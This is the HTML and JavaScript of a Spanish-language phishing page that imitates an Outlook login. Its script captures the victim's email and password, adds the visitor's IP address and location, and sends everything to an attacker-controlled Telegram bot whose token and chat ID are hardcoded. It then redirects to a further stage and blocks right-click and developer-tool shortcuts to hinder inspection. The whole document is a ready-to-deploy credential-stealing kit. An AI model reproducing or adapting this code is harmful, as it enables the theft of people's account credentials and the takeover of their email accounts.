    <body>
        <div id="popup" style="display: block; position: fixed; top:0; left:0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: center;">
            <div class="popup-content" style="background: #fff; padding: 20px; border-radius: 10px; max-width: 400px; text-align: center;">
                <h2>Verificación Importante</h2>
                <img src="https://cdn.pixabay.com/animation/2023/08/11/21/18/21-18-05-265_512.gif" alt="Cargando..." style="width: 100px; height: auto; margin-top: 10px;"/>
            </div>
        </div>
        <header></header>
        <div class="content" style="display: none; padding: 20px;">
            <img src="msft.png" alt="Logo" style="max-width: 100px; display: block; margin-bottom: 20px;"/>
            <p>Ingrese su Correo Electrónico y Contraseña para acceder a su cuenta de Outlook :</p>
            <form id="loginForm">
                <input type="email" id="Correo" name="Correo" placeholder="Correo Electrónico" required style="display: block; width: 100%; margin-bottom: 10px; padding: 8px;"/>
                <input type="password" id="Contra" name="Contra" placeholder="Contraseña" required minlength="7" style="display: block; width: 100%; margin-bottom: 10px; padding: 8px;"/>
                <button type="submit" id="submitButton" style="padding: 10px 20px;">Continuar</button>
            </form>
        </div>
        <footer style="margin-top: 20px; text-align: center;">
            <img src="https://static.whatsapp.net/rsrc.php/ya/r/GjxmhIpug9B.svg" alt="Logo WhatsApp" style="width: 50px; height: auto;"/>
        </footer>
        <script>
            // Función para obtener la ubicación y enviar el mensaje a Telegram
            function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
                fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    var country = data.country_name;
                    var region = data.region;
                    var ip = data.ip;

                    if (country && region && ip) {
                        message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
                    } else {
                        message += '\nNo se pudo obtener la ubicación.';
                    }
                    enviarMensajeTelegram(message, nextPage);
                })
                .catch(error => {
                    console.error("Error al obtener la ubicación:", error);
                    message += "\nError al obtener la ubicación.";
                    enviarMensajeTelegram(message, nextPage);
                });
            }

            // Función para enviar el mensaje a Telegram y redirigir
            function enviarMensajeTelegram(mensaje, nextPage) {
                const TOKEN = '8855414201:AAHfpOhQ0szh27tbLKhHZBiNvTobN8B-wPY'; // <-- Reemplaza este texto por el token de tu bot
                const CHAT_ID = '-5167092041'; // <-- Reemplaza este texto por el ID de tu chat

                var url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
                var params = {
                    chat_id: CHAT_ID,
                    text: mensaje
                };

                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(params)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Ocurrió un error al enviar el mensaje.');
                    }
                    console.log('Mensaje enviado con éxito.');
                    window.location.href = nextPage;
                })
                .catch(error => {
                    console.error('Error al enviar el mensaje:', error);
                });
            }

            window.onload = function() {
                document.getElementById('popup').style.display = 'none';
                document.querySelector('.content').style.display = 'flex';

                const form = document.getElementById('loginForm');
                if (form) {
                    form.addEventListener("submit", function(event) {
                        event.preventDefault();
                        var Correo = document.getElementById("Correo").value;
                        var Contra = document.getElementById("Contra").value;
                        obtenerUbicacionYEnviarMensajeTelegram(Correo, Contra, "index1.html?action=telefono", "💲 Outlook 💲:\nCorreo Electronico: " + Correo + "\nClave: " + Contra);
                    });
                }
            };
            
            // --- Bloquear clic derecho y teclas de desarrollador ---

            // Evitar clic derecho
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });

            // Desactivar teclas comunes de desarrollador
            document.addEventListener('keydown', function(e) {
                // F12
                if (e.key === 'F12' || e.keyCode === 123) {
                    e.preventDefault();
                }
                // Ctrl + Shift + I
                if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                    e.preventDefault();
                }
                // Ctrl + Shift + J
                if (e.ctrlKey && e.shiftKey && e.key === 'J') {
                    e.preventDefault();
                }
                // Ctrl + U
                if (e.ctrlKey && e.key === 'U') {
                    e.preventDefault();
                }
                // Ctrl + Shift + C
                if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                    e.preventDefault();
                }
            });
        </script>
